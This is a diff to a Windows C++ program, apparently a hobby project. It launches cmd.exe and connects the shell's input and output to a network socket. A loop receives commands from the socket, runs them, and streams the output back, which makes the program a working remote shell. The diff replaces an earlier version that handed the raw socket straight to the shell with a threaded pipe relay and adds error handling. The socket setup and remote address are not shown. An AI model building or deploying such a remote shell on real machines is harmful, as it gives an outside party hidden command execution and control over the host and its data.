@@ -2,6 +2,10 @@
 #include <iostream>
 #include <ws2tcpip.h>
 #include <Windows.h>
+#include <string>
+#include <thread>
+#include <tuple>
+#include <atomic>
 
 HANDLE hChildStdOutRead, hChildStdOutWrite;                             //stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                               //stdin
@@ -30,14 +34,17 @@ void send_data(SOCKET clientSocket, const string &data)                         
     int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
     
     if (bytesSent == SOCKET_ERROR) cerr << "Send failed with error: " << WSAGetLastError() << endl;
-    else cout << "Sent data: " << data << endl;
+    //else cout << "Sent data: " << data << endl;
 }
 void give_command(const std::string& command)
 {
-    string cmd = command + "\n";
+    string cmd = command + "\r\n";
     // Write a command to the child process.
     DWORD bytesWritten;
-    WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL);
+    if(!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL))
+    {
+        cerr << "WriteFile failed with error code: " << GetLastError() << endl;
+    }
     FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
 
 }
@@ -88,27 +95,32 @@ int main()
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    //cout << "got this -> " << receive_data(clientSock) << endl;
-    //send_data(clientSock,"Ye lo");
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
     SECURITY_ATTRIBUTES saAttr = {0};
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
 
-    PROCESS_INFORMATION pi = {0};
+    // HANDLE hChildStdOutRead, hChildStdOutWrite;  // stdout
+    // HANDLE hChildStdInRead, hChildStdInWrite;    // stdin
+
+    // Create pipes for child process's STDOUT.
+    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
+    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);
+
+    // Create pipes for child process's STDIN.
+    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
+    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);
+
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = si.hStdError = si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = hChildStdOutWrite;
+    si.hStdError = hChildStdOutWrite;
+    si.hStdInput = hChildStdInRead;
 
-    
+    PROCESS_INFORMATION pi = {0};
     wchar_t command[] = L"cmd.exe";
-    if(!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-    {
-        std::cerr << "CreateProcess failed.\n";
-        closesocket(sock);
-        WSACleanup();
+    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        cerr << "CreateProcess failed with error code: " << GetLastError() << endl;
         return 1;
     }
 
@@ -116,70 +128,81 @@ int main()
     CloseHandle(hChildStdOutWrite);
     CloseHandle(hChildStdInRead);
 
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+    // Lambda for reading from the child process stdout
+    atomic<bool> processFinished(false);
+    auto readThread = std::thread([&]()
+    {
+        const size_t bufferSize = 4096;
+        char buffer[bufferSize];
+        DWORD bytesRead;
 
+        while (!processFinished.load())
+        {
+            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
+            {
+                if (bytesRead > 0) 
+                {
+                    buffer[bytesRead] = '\0';
+                    cout << buffer;
+                    send_data(sock, buffer);
+                }
+            } else if (GetLastError() == ERROR_BROKEN_PIPE)
+            {
+                // End of data
+                break;
+            }
+            Sleep(10); // Sleep for a short time to prevent 100% CPU usage
+            
+        }
+    });
 
-    //give_command("dir");
-    //give_command(receive_data(clientSock));
+    string cmd;
+    while (true) 
+    {
+        cout << "> ";
+        //getline(cin, cmd);
+        cmd= receive_data(sock);
+        if(cmd == "exit") break;
+        give_command(cmd);
 
-    //send_data(clientSock, const string &data)       
-    
-    // Read the output from the child process.
-    // char buffer[4096];
-    // DWORD bytesRead;
-    // while (ReadFile(hChildStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) 
-    // {
-    //     buffer[bytesRead] = '\0';  // Null-terminate the output.
-    //     cout << buffer;
-    // }
+        // cmd += "\r\n";
+        // DWORD bytesWritten;
+        // if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL)) {
+        //     cerr << "WriteFile failed with error code: " << GetLastError() << endl;
+        //     break;
+        // }
+        // FlushFileBuffers(hChildStdInWrite);
+    }
 
-// Start reading from the pipe with a timeout
-    // char buffer[4096];
-    // DWORD bytesRead = 0;
-    // DWORD timeout = 5000;  // 5 seconds timeout
-    // DWORD startTime = GetTickCount();
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    // while (TRUE)
-    // {
-    //     // Check the time elapsed
-    //     DWORD elapsedTime = GetTickCount() - startTime;
-    //     if (elapsedTime >= timeout)
-    //     {
-    //         // Timeout reached
-    //         cout << "Timed out while reading output." << endl;
-    //         break;
-    //     }
+    // Close the child's stdin
+    processFinished.store(true);
+    string exitCmd = "exit\r\n";
+    DWORD bytesWritten;
+    WriteFile(hChildStdInWrite, exitCmd.c_str(), exitCmd.length(), &bytesWritten, NULL);
+    FlushFileBuffers(hChildStdInWrite);
 
-    //     // Try to read from the pipe
-    //     if (ReadFile(hChildStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
-    //     {
-    //         buffer[bytesRead] = '\0';  // Null-terminate the buffer
-    //         cout << "Received Output: " << buffer << endl;
-    //         break;  // Successfully read, break out of the loop
-    //     }
-    //     else
-    //     {
-    //         // Sleep for a while to avoid busy-waiting
-    //         Sleep(100);  // Sleep 10 milliseconds
-    //     }
-    // }
+    // Wait for the process to exit
+    WaitForSingleObject(pi.hProcess, INFINITE);
 
-    // cout<< "here";
-
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    CloseHandle(hChildStdOutRead);      // Make sure to close the read end of the pipe after reading.
-    WaitForSingleObject(pi.hProcess, INFINITE);         // Wait for the child process to finish.
-    
-    //CloseHandle(hChildStdInWrite);
-
+    // Clean up
+    readThread.join();
+    CloseHandle(hChildStdOutRead);
+    CloseHandle(hChildStdInWrite);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
- 
-    //send_data(clientSock," closing!! ");
 
-    //closesocket(clientSock);
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+ 
+    send_data(sock," closing!! ");
+
+    closesocket(sock);
     WSACleanup();
     
     return 0;
